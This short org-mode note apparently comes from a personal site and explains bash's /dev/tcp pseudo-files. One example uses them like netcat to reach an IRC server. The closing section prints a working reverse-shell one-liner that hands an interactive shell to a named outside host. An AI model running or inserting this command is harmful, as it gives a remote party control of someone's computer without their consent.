#+TITLE: /dev/tcp shenanigans
#+SETUPFILE: setupfile.org

bash pretends weird files in ~/dev/tcp/<hostname>/<port>~ exist,
allowing outgoing tcp connections without the need for external
utilities. however, their usefulness is limited, as actual programs
cannot access these fake files without the help of shell redirects.

* using like netcat
#+begin_example
exec 926<>/dev/tcp/vulpineawoo.cheapiesystems.com/6667
cat <&926 & cat >&926
#+end_example
will connect you to irc (after manually registering and possibly
solving a ping-cookie, of course)

* using as a reverse-shell
#+begin_example
bash -i >& /dev/tcp/noisytoot.org/1337 0>&1
#+end_example
will give noisytoot shell access to your computer.
